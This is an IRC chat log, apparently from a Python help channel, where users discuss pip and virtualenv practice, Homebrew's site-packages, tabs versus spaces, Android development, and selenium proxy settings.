[13:16:39] <cdunklau> WhiteDevil: python is used for looots of different stuff
[13:16:49] <han-solo> Python is used in a great deal of scientific computing, machine learning, etc
[13:17:06] <WhiteDevil> yea but i mean like the books voilent pytoh, black hat python and other python books witht he same type of genre
[13:17:12] <Yhg1s> rodskagg: you need to move lines 104/105 out of the 'with' block.
[13:17:20] <Yhg1s> rodskagg: because you didn't close the file yet, the file is still empty (or partially written)
[13:17:46] *** Quits: yemel (~yemel@unaffiliated/yemel) (Ping timeout: 264 seconds)
[13:17:48] <WhiteDevil> which brings me to a realisationt hat ython is also good for sys admin tasks
[13:17:58] <WhiteDevil> because i wish to be a sys admin
[13:17:58] <rodskagg> Yhg1s: you legend. :D
[13:18:03] <WhiteDevil> studying rhcsa
[13:18:05] <cdunklau> heh
[13:18:17] <cdunklau> WhiteDevil: sure
[13:18:22] *** Quits: fikka (~fikka@254C2DB4.nat.pool.telekom.hu) (Ping timeout: 264 seconds)
[13:18:24] *** Quits: Alina-malina (~Alina-mal@unaffiliated/alina-malina) (Max SendQ exceeded)
[13:18:37] <cdunklau> it's useful for a lot of things, like i said. it's a general purpose programming language
[13:18:37] <rodskagg> Yhg1s: yeah, i had the stuff to run the script indented the same as the stuff writing the script. so it wouldn't work.
[13:18:45] <gthank> WhiteDevil I think you just haven't seen all the different aspects of the Python community yet. Web dev is a top-tier area. Like they said, read up on Django and Flask. Instagram and Disqus are both built on Python
[13:18:52] *** Quits: nkuttler (~nkuttler@unaffiliated/nkuttler) (Quit: Changing server)
[13:18:58] *** Joins: AnySomebody (~AnySomebo@192.129.2.104)
[13:19:02] *** Joins: RickDeckard (~tgburrin@108.60.152.194)
[13:19:04] <rodskagg> Yhg1s: thanks so much. :)
[13:19:15] *** Joins: nkuttler (~nkuttler@unaffiliated/nkuttler)
[13:19:21] <WhiteDevil> i heard nasa uses python or was it google
[13:19:27] <cdunklau> WhiteDevil: both
[13:20:03] <WhiteDevil> thats cool industry gaints have python as one of thier coping skills ;)
[13:20:32] <WhiteDevil> this book i got called python crash course itsa  no starch press book
[13:20:33] <han-solo> WhiteDevil: and python is not just Cpython :)
[13:20:36] <WhiteDevil> hoping to learn from it
[13:20:54] *** Quits: kushalAgrawal (uid279683@gateway/web/irccloud.com/x-dwccmftwnnswpbda) (Quit: Connection closed for inactivity)
[13:20:54] <WhiteDevil> it has 3 projects
[13:20:56] <WhiteDevil> one is a game
[13:21:07] <WhiteDevil> the other is a data visualization and the 3rd a web app
[13:21:20] *** Joins: yemel (~yemel@unaffiliated/yemel)
[13:21:22] <WhiteDevil> i mean i started programming when i was 15
[13:21:24] <callMe_something> why spaces are recommended over tabs in PEP8?
[13:21:25] *** Joins: s14ve (~s14ve@ip-37-188-224-12.eurotel.cz)
[13:21:26] *** Quits: malachi (~malconten@91.207.175.200) (Ping timeout: 260 seconds)
[13:21:44] *** Quits: spufi (~spufi@dd47b0e02.static.telenet.be) (Quit: Leaving)
[13:21:45] <WhiteDevil> and i learnt C ..but C always had me feeling like i could never fully master that programming language
[13:21:48] <WhiteDevil> now there is python
[13:21:50] <Yhg1s> callMe_something: because mixing tabs and spaces is bad, and tabs are variable and hard to spot.
[13:21:55] *** ECDHE_RSA_AES256 is now known as ecdhe
[13:21:59] <WhiteDevil> that dosnt need you to create xcomplex data ttypes
[13:22:02] <WhiteDevil> dosnt have pointers
[13:22:02] *** Joins: ssarah (~miguel@194.65.5.235)
[13:22:07] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[13:22:08] *** Quits: ssarah (~miguel@194.65.5.235) (Max SendQ exceeded)
[13:22:16] *** Quits: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) (Quit: Leaving.)
[13:22:26] <WhiteDevil> and that just makes it easier to spend time on actually coding than in trivial matters like memory
[13:22:29] *** Joins: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8)
[13:22:58] *** Joins: [MisbehavingOS] (~while@unaffiliated/awaxx/x-0928682)
[13:23:05] <han-solo> WhiteDevil: The python you are referring to is Cpython :). There is also C like python :), which is kinda like C and python :)
[13:23:22] <WhiteDevil> i see
[13:23:28] *** Joins: iAmerikan (~dwshrewt@unaffiliated/iamerikan)
[13:23:29] <Yhg1s> han-solo: eh, no.
[13:23:36] <WhiteDevil> ill try out regular mython and see how far i get with it
[13:23:44] <WhiteDevil> depening on that ..i might get back to c eventually
[13:23:49] <callMe_something> Yhg1s: But tabs seems more convenient . I set 4spaces for a tab in Vim. Its lot more easier to indent with tab than space.
[13:23:50] <Yhg1s> Python is the language. CPython is one of the implementations. None of what WhiteDevil said is about the CPython implementation.
[13:23:53] <bjs> WhileTrue: han-solo is trying to say that there are many implementations of python out there, some of which are quite widely used
[13:23:54] <WhiteDevil> you cant really escape C in the programming world
[13:23:59] <bjs> WhiteDevil: sorry ^
[13:24:00] *** Joins: codesoup (~codesoup@2607:fea8:e220:70:dc68:69d8:61d7:4e49)
[13:24:13] <Yhg1s> callMe_something: you should indent with the tab *key*, but not tab *characters*. Your editor will insert spaces for you.
[13:24:14] <han-solo> Cython is a superset of python, right ?
[13:24:14] <odinsbane> callMe_something: often editors can insert spaces when you press tab.
[13:24:20] <Yhg1s> han-solo: Cython isn't CPython.
[13:24:43] <han-solo> Yeah, Cpython is an implementation
[13:24:56] *** Joins: tsglove (~tsglove@12.205.72.46)
[13:24:57] *** Quits: hardikjasani (uid269869@gateway/web/irccloud.com/x-gyvpocwdutpfqhbk) (Quit: Connection closed for inactivity)
[13:25:03] <Yhg1s> WhiteDevil: you can escape C just fine.
[13:25:16] *** Quits: Haudegen (~quassel@212-186-77-29.static.upcbusiness.at) (Remote host closed the connection)
[13:25:29] <han-solo> and Cython is some superset of python, which is used to write C extensions, no ?
[13:25:52] <han-solo> And there is Jython
[13:25:52] <Yhg1s> han-solo: not necessarily, but I don't know why any of this is relevant.
[13:26:02] *** Joins: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491)
[13:26:25] <bjs> WhileTrue: btw how did you get on with those snippets of code earlier? Do they make sense now?
[13:26:40] *** Joins: Mat001 (~Mat001@c-71-202-209-15.hsd1.ca.comcast.net)
[13:26:44] <han-solo> I'm just saying, as bjs pointed out
[13:26:49] <han-solo> there is pypy
[13:27:01] *** Quits: Wr4i7h (~abcd@a85-139-11-90.cpe.netcabo.pt) ()
[13:27:09] <bjs> han-solo: (I don't know *why* you're saying, but yes, there are various implementations out there)
[13:27:09] *** Quits: kurkale61 (~kurkale6k@84.45.99.125) (Read error: Connection reset by peer)
[13:27:10] <han-solo> but yeah, i think it doesn';t matter, anyway
[13:27:21] *** Joins: kurkale6ka (~kurkale6k@84.45.99.125)
[13:27:21] *** Joins: canarts (~stranac@89-172-229-114.adsl.net.t-com.hr)
[13:27:54] *** Quits: andyt (~andyt@alligin.plus.com) (Quit: leaving)
[13:28:02] <ytrezq> ikanobori ?
[13:29:10] *** Quits: stahl (~stahl@81.24.150.83.ftth.as8758.net) (Ping timeout: 264 seconds)
[13:29:14] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 256 seconds)
[13:29:42] *** Quits: bartmon (~bartmon@89-212-95-222.link.t-2.net) (Quit: Leaving)
[13:29:48] *** Joins: elyezer_ (~elyezer@unaffiliated/elyezer)
[13:30:15] *** Quits: Budgii (~Budgii@unaffiliated/budgii) (Remote host closed the connection)
[13:30:28] *** Joins: Budgii (~Budgii@unaffiliated/budgii)
[13:30:46] <ikanobori> ytrezq: Then you join those plaintexts together in the format that S/MIME expects them which I don't know.
[13:30:56] <ikanobori> So you extract all the payloads then join them in the format that S/MIME wants.
[13:30:56] *** Quits: stranac (~stranac@78-1-33-209.adsl.net.t-com.hr) (Ping timeout: 256 seconds)
[13:31:07] *** Joins: Elodin (~weechat@unaffiliated/padawan)
[13:31:20] *** Joins: Alina-malina (~Alina-mal@unaffiliated/alina-malina)
[13:31:21] *** Quits: tty (~none@unaffiliated/minimalism) (Quit: tty)
[13:32:21] *** Joins: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de)
[13:32:33] *** Quits: diox (~u@h-103-251.A785.priv.bahnhof.se) (Quit: upgrade)
[13:33:35] *** Joins: abramovich (~abramovic@gateway/tor-sasl/abramovich)
[13:35:12] *** Joins: enterprisey (~enterpris@wikipedia/enterprisey)
[13:35:40] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[13:35:56] *** Quits: JackLau (~JackLau@103.106.98.28) (Remote host closed the connection)
[13:36:29] *** Quits: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl) (Ping timeout: 276 seconds)
[13:37:05] *** Quits: greg_f (~greg@altlinux/developer/greg) (Ping timeout: 240 seconds)
[13:37:27] *** Joins: Syzygy (~Syzygy@2001:850:40bc:8000:94c8:3232:f35e:1ba8)
[13:38:01] *** Joins: amirpro_ (~amirpro@154.238.18.159)
[13:38:25] *** Joins: patdaburu (~patdaburu@24-177-166-2.dhcp.mrqt.mi.charter.com)
[13:38:42] *** Quits: amirpro (~amirpro@41.234.193.158) (Ping timeout: 260 seconds)
[13:38:53] *** Quits: stitched_unicorn (~textual@fs276ed214.tkyc201.ap.nuro.jp) (Quit: stitched_unicorn)
[13:38:53] *** Quits: [MisbehavingOS] (~while@unaffiliated/awaxx/x-0928682) (Quit: .)
[13:39:09] *** amirpro_ is now known as amirpro
[13:39:13] *** Joins: BPL (~BPL@76.0.60.213.dynamic.reverse-mundo-r.com)
[13:39:46] *** Joins: Chizz8l (~Den@46-255.artnet.dn.ua)
[13:40:01] *** Joins: amz31 (~amz3@fsfe/amz3)
[13:40:10] *** Joins: Atque (~Atque@unaffiliated/atque)
[13:40:19] *** Joins: [MisbehavingOS] (~while@unaffiliated/awaxx/x-0928682)
[13:40:54] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[13:42:13] *** Joins: Haudegen (~quassel@212-186-77-29.static.upcbusiness.at)
[13:42:39] *** Quits: iAmerikan (~dwshrewt@unaffiliated/iamerikan) (Quit: WeeChat 2.1)
[13:42:42] *** Quits: zh2683 (~user@125.119.209.170) (Remote host closed the connection)
[13:42:43] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[13:42:51] *** Joins: zarzar (~zarzar@184.75.233.58)
[13:43:38] *** Joins: ssarah (~miguel@194.65.5.235)
[13:43:43] *** Quits: ssarah (~miguel@194.65.5.235) (Max SendQ exceeded)
[13:44:28] *** Joins: uksio (~uksio@p200300CB1BD1650099B3ACC1610D1BB4.dip0.t-ipconnect.de)
[13:45:12] *** Quits: psychuil (~psychuil@94.188.155.158) (Remote host closed the connection)
[13:45:33] *** Joins: vancha (~vancha@2a02:a211:2400:ba00:334d:6c58:6492:3c3b)
[13:46:01] *** Quits: heitzmann (~heitzmann@s328a-1.fee.unicamp.br) (Quit: WeeChat 2.1)
[13:46:21] *** Quits: Chizz8l (~Den@46-255.artnet.dn.ua) (Ping timeout: 240 seconds)
[13:46:29] *** Quits: amirpro (~amirpro@154.238.18.159) (Quit: amirpro)
[13:46:37] *** Quits: fr0ddy (~fr0ddy@49.248.66.98) (Quit: Leaving)
[13:47:20] *** Quits: uks (~uksio@p200300CB1BD1650599B3ACC1610D1BB4.dip0.t-ipconnect.de) (Ping timeout: 245 seconds)
[13:47:20] *** Joins: heitzmann (~heitzmann@s328a-1.fee.unicamp.br)
[13:47:46] *** Quits: n35xdxb0 (~n35xdxb0@cpc130684-camd16-2-0-cust846.know.cable.virginm.net) (Ping timeout: 264 seconds)
[13:47:50] *** Quits: nelsnelson (~nelsnelso@2605:6000:1023:807e:11df:1293:dcf6:3e9a) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[13:48:07] *** Joins: dimitrovskif (~dimitrovs@89.205.68.164)
[13:48:07] *** Quits: giaco (~giaco@37.162.24.130) (Read error: Connection reset by peer)
[13:48:36] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[13:48:44] *** Quits: codesoup (~codesoup@2607:fea8:e220:70:dc68:69d8:61d7:4e49) (Ping timeout: 276 seconds)
[13:48:59] *** Joins: giaco (~giaco@37.162.24.130)
[13:49:37] *** Joins: n35xdxb0 (~n35xdxb0@81.171.98.48)
[13:49:37] *** Quits: justanotheruser (~justanoth@unaffiliated/justanotheruser) (Quit: WeeChat 2.0)
[13:50:21] *** Joins: amirpro (~amirpro@154.238.18.159)
[13:51:13] *** Joins: modwizcode (~modwizcod@140.221.3.22)
[13:51:47] *** Joins: nigel45 (~w@c-76-126-181-47.hsd1.ca.comcast.net)
[13:52:02] *** Quits: amirpro (~amirpro@154.238.18.159) (Remote host closed the connection)
[13:52:16] *** Quits: Random832 (~random@unaffiliated/random832) (Quit: upgrading)
[13:52:23] *** Quits: tuxiano (~tuxiano@2a02:8070:89d4:aa00:61a6:6e95:fb56:da5e) (Remote host closed the connection)
[13:52:35] *** Joins: akmod (~akmod@204.246.145.50)
[13:52:45] *** Joins: amirpro (~amirpro@41.236.135.75)
[13:52:52] *** Quits: akmod (~akmod@204.246.145.50) (Remote host closed the connection)
[13:53:32] *** Joins: Chizz8l (~Den@46-255.artnet.dn.ua)
[13:54:03] *** Joins: floryst___ (~floryst@cpe-24-163-58-187.nc.res.rr.com)
[13:54:05] *** Quits: RickDeckard (~tgburrin@108.60.152.194) (Ping timeout: 240 seconds)
[13:54:12] *** Quits: AliGeyik (~Thunderbi@82.222.185.98) (Quit: AliGeyik)
[13:54:53] *** Joins: codesoup (~codesoup@174.119.180.211)
[13:55:01] *** Joins: RickDeckard (~tgburrin@108.60.152.194)
[13:55:33] *** Joins: enriq (~pitagoras@190.104.249.158)
[13:55:46] *** Joins: bigjazzsound (~bigjazzso@2604:a880:cad:d0::2fd:9001)
[13:56:27] *** Quits: andylavarre (~andy@mobile-166-177-57-15.mycingular.net) (Ping timeout: 245 seconds)
[13:56:33] *** Quits: amirpro (~amirpro@41.236.135.75) (Client Quit)
[13:56:40] *** Quits: bigjazzsound (~bigjazzso@2604:a880:cad:d0::2fd:9001) (Client Quit)
[13:56:46] *** Joins: andylavarre (~andy@mobile-166-176-248-117.mycingular.net)
[13:56:57] *** Joins: amirpro (~amirpro@154.238.18.159)
[13:57:22] *** Quits: WhileTrue (~WhileTrue@unaffiliated/whiletrue) (Ping timeout: 264 seconds)
[13:57:30] *** Quits: floryst__ (~floryst@cpe-24-163-58-187.nc.res.rr.com) (Ping timeout: 265 seconds)
[13:57:32] *** Quits: dimitrovskif (~dimitrovs@89.205.68.164) (Ping timeout: 268 seconds)
[13:57:32] *** Quits: traira (~Adium@187-78-31-157.user.veloxzone.com.br) (Ping timeout: 268 seconds)
[13:58:15] *** Quits: najtsirk (~kristjan@185.122.70.3) (Ping timeout: 260 seconds)
[13:58:46] *** Quits: adoua (~adoua@unaffiliated/adoua) (Ping timeout: 268 seconds)
[13:58:48] *** Joins: _feuillemorte (irc@nat/redhat/x-frazbaqrhknqskfy)
[13:59:20] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Quit: Leaving)
[13:59:27] *** Quits: Technodrome (~textual@unaffiliated/technodrome) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:00:44] *** Quits: feuillemorte (irc@nat/redhat/x-lticnzwccvgtljsm) (Ping timeout: 255 seconds)
[14:02:00] *** Quits: amirpro (~amirpro@154.238.18.159) (Quit: amirpro)
[14:02:23] *** Joins: amirpro (~amirpro@154.238.18.159)
[14:02:34] *** Joins: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com)
[14:02:56] *** Quits: vancha (~vancha@2a02:a211:2400:ba00:334d:6c58:6492:3c3b) (Remote host closed the connection)
[14:03:16] *** Joins: semeion (~semeion@unaffiliated/semeion)
[14:03:20] *** Joins: zefferno (~zefferno@unaffiliated/zefferno)
[14:03:36] <callMe_something> Guys how man of you develop Android apps with Python. Python vs Kotlin which is better for Android application development?
[14:04:09] *** Quits: abramovich (~abramovic@gateway/tor-sasl/abramovich) (Quit: Leaving)
[14:04:12] *** Joins: kaffeetrauma (~Thunderbi@p200300CF33CBCD00EA2AEAFFFE805F93.dip0.t-ipconnect.de)
[14:05:02] <Wulf> callMe_something: Maybe C?
[14:05:17] *** Joins: joebobjoe (~joebobjoe@unaffiliated/joebobjoe)
[14:05:30] *** Quits: l00t (~l00t@82.119.168.140) (Ping timeout: 256 seconds)
[14:05:42] *** Joins: vancha (~vancha@2a02:a211:2400:ba00:334d:6c58:6492:3c3b)
[14:05:46] <runciter> callMe_something, almost certainly kotlin
[14:05:50] <ChrisWarrick> callMe_something: You can’t really do it with Python.  Kotlin (or Java) is your best bet.
[14:06:21] <ChrisWarrick> Wulf: nobody does it with C, and the C++ API is meant for games and graphical experiences, not typical apps
[14:06:31] <sparrowsword> how to use socks proxies with selenium ie?
[14:06:31] *** Quits: amirpro (~amirpro@154.238.18.159) (Client Quit)
[14:06:57] *** Quits: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com) (Ping timeout: 240 seconds)
[14:07:04] *** Joins: amirpro (~amirpro@154.238.18.159)
[14:07:05] <joebobjoe> how do I clean up a site_packages? I have too many packages from random pip installs
[14:07:09] <ChrisWarrick> sparrowsword: configure your selenium-operated web browser to use said proxy
[14:07:11] <ChrisWarrick> joebobjoe: you don’t.
[14:07:23] *** Joins: subho (~subho@fedora/subho)
[14:07:24] *** Quits: Chizz8l (~Den@46-255.artnet.dn.ua) (Ping timeout: 268 seconds)
[14:07:31] <MrElendig> joebobjoe: this is why you don't run pip as an administrator
[14:07:42] <ChrisWarrick> joebobjoe: if you’re using a virtualenv: nuke it from orbit, or try to clean up manually with `pip list`
[14:07:44] <sparrowsword> ChrisWarrick: Hilarious, but https://paste.pound-python.org/show/lYNBrNJVvzapE4xSCVW1/
[14:07:44] <callMe_something> I am newbie, I know this is noob question.But people always tell "Youtube ,Quora, Instagram are mostly written with python" why is that???
[14:07:51] <ChrisWarrick> joebobjoe: if you are not: you can’t do it
[14:08:04] <ChrisWarrick> callMe_something: The web part is written with Python.  The Android apps are not.
[14:08:11] <Wulf> ChrisWarrick: That's the reason why I don't write apps :-)
[14:08:34] <sparrowsword> ChrisWarrick: selenium.common.exceptions.InvalidArgumentException: Message: Invalid capabilities in alwaysMatch: unknown proxy setting named
[14:08:37] <joebobjoe> ChrisWarrick: why? surely there must be a way to pip list only top-level dependencies?
[14:08:47] <ChrisWarrick> joebobjoe: no
[14:08:51] *** Joins: Fulgen (~Fulgen@078132058052.public.t-mobile.at)
[14:08:57] <ChrisWarrick> sparrowsword: Internet Explorer, why?!
[14:09:20] <Yhg1s> joebobjoe: pip isn't really a package manager. You can query around to find things that nothing depends on, but you'll still be likely to break things you didn't realise need the package.
[14:09:25] *** Quits: callMe_something (~callMe_Du@103.208.112.176) (Quit: Leaving)
[14:09:27] <sparrowsword> ChrisWarrick: cause it supports what i need
[14:09:43] *** Quits: amirpro (~amirpro@154.238.18.159) (Client Quit)
[14:09:48] <ChrisWarrick> sparrowsword: it’s a terrible web browser that severely limits your choices
[14:09:50] <Wulf> sparrowsword: Please don't use IE anymore, it's obsolete. How about Edge?
[14:09:52] <Yhg1s> joebobjoe: start fresh with virtualenvs. If you want to clean the system, reinstalling it is the only way to do it, really.
[14:10:07] <sparrowsword> ChrisWarrick: believe me, i have chosen it on purpose with specific intent
[14:10:12] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 245 seconds)
[14:10:18] <joebobjoe> Yhg1s: so re-install, then never uses pip install unless if in a virtualenv?
[14:10:19] *** Quits: max_m (~max_m@gateway/tor-sasl/maxm/x-47377621) (Ping timeout: 250 seconds)
[14:10:28] *** Joins: lastmanstanding (~arjoonn@111.92.51.39)
[14:10:29] <sparrowsword> Wulf: i am aware
[14:10:40] <sparrowsword> Wulf: thats the reason im using it
[14:10:43] <Yhg1s> joebobjoe: yes.
[14:10:46] <joebobjoe> what about command line tools? do I install those into venvs too?
[14:10:50] <Yhg1s> joebobjoe: yes.
[14:10:55] <Yhg1s> joebobjoe: or, using your system's package manager.
[14:11:14] <Yhg1s> joebobjoe: you can symlink the venv-installed command line tools into your own bin directory if you prefer.
[14:11:23] <sparrowsword> ChrisWarrick: Wulf: anyways, y cant i get the proxies to work?
[14:11:24] <joebobjoe> Yhg1s: how would I use venvs to install command line tools with pip?
[14:11:28] <joebobjoe> Yhg1s: oh
[14:11:48] *** Quits: Spaaaaaaaaaaaace (~Spaaaaaaa@unaffiliated/spaaaaaaaaaaaace) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:11:48] <Yhg1s> joebobjoe: venv/bin/pip install command-line-tool
[14:11:57] *** Joins: EchoPapa (~EchoPapa@88.128.81.19)
[14:12:14] *** Joins: Chizz8l (~Den@46-255.artnet.dn.ua)
[14:12:15] *** Quits: jlf (~jlf@pdpc/supporter/active/jlf) (Ping timeout: 260 seconds)
[14:12:17] *** Joins: voidsec (voidsec@gateway/vpn/privateinternetaccess/voidsec)
[14:12:21] *** Joins: voidsec_ (voidsec@gateway/vpn/privateinternetaccess/voidsec)
[14:12:25] <joebobjoe> and I don't have to have the venv activated to use the command line tool?
[14:12:37] <Yhg1s> joebobjoe: you do not, no. activating a virtualenv just messes with PATH. you never have to do it.
[14:12:57] *** Quits: Kestrel-029 (~Nicmavr@unaffiliated/nicmavr) (Read error: Connection reset by peer)
[14:13:04] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Remote host closed the connection)
[14:13:07] <joebobjoe> so activating a venv just makes sure the venv python executables are called instead of the system?
[14:13:47] <Yhg1s> joebobjoe: it just puts the virtualenv's bin directory in front of everything else in PATH. If you execute things through, for example, shell aliases, they can still use something else.
[14:13:48] <joebobjoe> and I'm assuming command line tools installed with pip in a venv have a # interpreter line at the top pointing to the venv python?
[14:13:54] <Yhg1s> joebobjoe: yes.
[14:13:58] *** Joins: feuillemorte (irc@nat/redhat/x-slragtzfzskhvrzd)
[14:14:41] *** Quits: nigel45 (~w@c-76-126-181-47.hsd1.ca.comcast.net) (Ping timeout: 256 seconds)
[14:14:42] <sparrowsword> ChrisWarrick: Wulf: i need NPAPI support
[14:14:55] <joebobjoe> I wonder if in the future python scripts will be compiled to native code so python command line tools could be used without interpreter
[14:15:03] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[14:15:04] <ChrisWarrick> joebobjoe: no, they won’t
[14:15:04] <joebobjoe> like go
[14:15:05] *** Joins: WhileTrue (~WhileTrue@unaffiliated/whiletrue)
[14:15:05] <Yhg1s> joebobjoe: very unlikely.
[14:15:34] *** Quits: _feuillemorte (irc@nat/redhat/x-frazbaqrhknqskfy) (Ping timeout: 256 seconds)
[14:15:42] <joebobjoe> does a default python 3 install install pip?
[14:15:46] <ChrisWarrick> it does
[14:15:53] <Yhg1s> joebobjoe: it depends on how you install it.
[14:15:59] <joebobjoe> because then what is the point of having pip in my path if it is best practice to always use it inside a venv?
[14:16:01] *** Quits: s14ve (~s14ve@ip-37-188-224-12.eurotel.cz) (Ping timeout: 248 seconds)
[14:16:27] *** Quits: soxhlet (~soxhlet@mue-88-130-67-155.dsl.tropolys.de) (Ping timeout: 240 seconds)
[14:16:47] <Yhg1s> joebobjoe: let's just say the practice of installing pip predates the practice of virtualenvs.
[14:16:49] *** Joins: soxhlet (~soxhlet@i59F72353.versanet.de)
[14:16:57] *** Joins: Signaltonsalat (~dickbutt@p5DC7F87D.dip0.t-ipconnect.de)
[14:17:10] <WhileTrue> bjs, sorry, I was away..on the contrary, what made sense earlier got obscure now :)
[14:17:11] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[14:17:47] *** Joins: rendered (~chem@155-186-143-228.dhcp.chtrptr.net)
[14:17:47] <joebobjoe> Yhg1s: ok so pip has become a landmine
[14:18:00] <ChrisWarrick> no, not really
[14:18:05] *** Quits: PulseAsio (~PulseAsio@dw7724211510.amsterdam-tc.dataweb.net) (Ping timeout: 240 seconds)
[14:18:11] <joebobjoe> well I was just told to nuke my pip install
[14:18:13] <ChrisWarrick> pip install --user can still be useful, and virtualenvs still use pip
[14:18:24] <bjs> WhileTrue: what is obscure now?
[14:18:32] *** Quits: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2) (Ping timeout: 245 seconds)
[14:18:34] <Yhg1s> joebobjoe: running pip as root is an issue. running pip as a regular user, not so much.
[14:18:39] <joebobjoe> yea but using pip without thought is broken
[14:18:51] <Yhg1s> joebobjoe: running things as root without thought is the problem.
[14:19:02] <joebobjoe> surprisingly I'm not using root
[14:19:16] <Yhg1s> joebobjoe: okay, which site-packages directory is giving you trouble then?
[14:19:16] *** Quits: agent_white (~agent_whi@unaffiliated/agent-white/x-6197888) (Remote host closed the connection)
[14:20:13] <joebobjoe> homebrew's site-packages. homebrew's default install uses a global directory owned by the installing user
[14:20:14] *** Quits: enriq (~pitagoras@190.104.249.158) (Read error: Connection reset by peer)
[14:20:16] <WhileTrue> bjs, I have some basic points missing, I think I need to view them first
[14:20:26] <joebobjoe> which I just realized is actually retarded
[14:20:38] *** Joins: enriq (~pitagoras@190.104.249.158)
[14:20:51] <ChrisWarrick> joebobjoe: it’s a way to avoid typing sudo on every brew command (and assumes single-user systems)
[14:20:52] <bjs> WhileTrue: we can help with that, if you show us something that confuses you we can tell you what you're missing and point you towards resources to learn it
[14:21:02] *** Quits: giaco (~giaco@37.162.24.130) (Remote host closed the connection)
[14:21:04] *** Joins: s14ve (~s14ve@ip-78-102-32-106.net.upcbroadband.cz)
[14:21:06] <ChrisWarrick> joebobjoe: you’ll find that all your packages will be gone the moment you upgrade to python 3.7
[14:21:21] *** Joins: Rapture (~textual@50-204-232-30-static.hfc.comcastbusiness.net)
[14:21:23] <joebobjoe> ChrisWarrick: yea it seems the site-packages is versioned
[14:21:29] *** Joins: xpunkt (~philipp@HSI-KBW-085-216-094-126.hsi.kabelbw.de)
[14:21:40] <joebobjoe> ChrisWarrick: it seems homebrew should just install to user dirs then
[14:22:00] *** Quits: xpunkt (~philipp@HSI-KBW-085-216-094-126.hsi.kabelbw.de) (Client Quit)
[14:22:04] *** Quits: tobra (~tobra@gate.acs-plus.fta-berlin.de) (Remote host closed the connection)
[14:22:06] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 260 seconds)
[14:22:11] <ChrisWarrick> joebobjoe: and uninstalling stuff from that place is slightly less problematic, since you won’t break much if you nuke everything (at worst, some homebrew packages)
[14:22:19] <joebobjoe> ha! and other homebrew software apparently install into homebrew's site-packages... that is a nightmare
[14:22:31] <joebobjoe> so if you upgrade python all you're python deps break
[14:22:35] <joebobjoe> and your homebrew deps
[14:22:36] <joebobjoe> haha
[14:22:44] *** Joins: void_sec3301 (voidsec@gateway/vpn/privateinternetaccess/voidsec)
[14:22:46] <ChrisWarrick> that happens everywhere
[14:22:46] <Falc> What's the quickest way to get a timezone-aware datetime representing (local) 00:00:00 today?
[14:23:17] <joebobjoe> ChrisWarrick: yea but I just realized I can't nuke site-packages now
[14:23:21] <ChrisWarrick> Falc: dateutil can do it, for example
[14:23:29] <joebobjoe> ChrisWarrick: because I can't tell what other actuall homebrew packages are using it
[14:23:45] <dude-x> ChrisWarrick oh wow all the packages are gone with the install of 3.7 with homebrew.
[14:23:48] <ChrisWarrick> joebobjoe: upgrade to 3.7 and your problem will be gone
[14:23:51] <sparrowsword> ChrisWarrick: Wulf: nvm figured how to use ff to do what i need
[14:24:11] <dude-x> ChrisWarrick no biggie i use virtualenvs
[14:24:12] *** Quits: voidsec_ (voidsec@gateway/vpn/privateinternetaccess/voidsec) (Ping timeout: 256 seconds)
[14:24:13] <joebobjoe> ChrisWarrick: the problem will just come back. homebrew packages will install python bindings into site-packages
[14:24:15] <ChrisWarrick> dude-x: Yes. You also need to recreate all virtualenvs from scratch.
[14:24:25] <ChrisWarrick> joebobjoe: aye, but you won’t touch that directory
[14:24:31] *** Quits: voidsec (voidsec@gateway/vpn/privateinternetaccess/voidsec) (Ping timeout: 256 seconds)
[14:25:14] <joebobjoe> ChrisWarrick: but I bet homebrew isn't smart enough to realize python dependencies break when upgrading from python3.6 to python3.7
[14:25:23] <joebobjoe> so I have to reinstall all of my homebrew packages
[14:25:27] <ChrisWarrick> joebobjoe: naaah
[14:25:45] <ChrisWarrick> joebobjoe: the homebrew devs should have bumped package versions due to that
[14:25:52] <dude-x> this^
[14:25:54] *** Quits: lumm (~lumm@16.42.136.77.rev.sfr.net) (Ping timeout: 268 seconds)
[14:26:03] <joebobjoe> homebrew should have never touched system software
[14:26:07] <joebobjoe> that already comes with mac
[14:26:19] <ChrisWarrick> it does not do that
[14:26:21] <joebobjoe> or at least python2
[14:26:32] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Remote host closed the connection)
[14:26:33] *** Joins: uttam (~uttam@116.193.133.53)
[14:26:50] <ChrisWarrick> it does not do anything with it
[14:27:20] <joebobjoe> yea but it is overriding it
[14:27:23] <ChrisWarrick> apple’s python 2.7.10 and homebrew’s 2.7.15 are completely separate from each other
[14:27:33] *** Quits: uttam (~uttam@116.193.133.53) (Client Quit)
[14:27:44] *** Joins: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au)
[14:27:48] *** Joins: uttam (~uttam@116.193.133.53)
[14:27:51] <ChrisWarrick> the override happens only if you put /usr/local/bin before /usr/bin in your path, which you don’t have to do to use homebrew
[14:28:02] <dude-x> (i hope Mojave updates builtin python to 2.7.15+)
[14:28:04] *** Joins: corretico (~corretico@186.4.59.151)
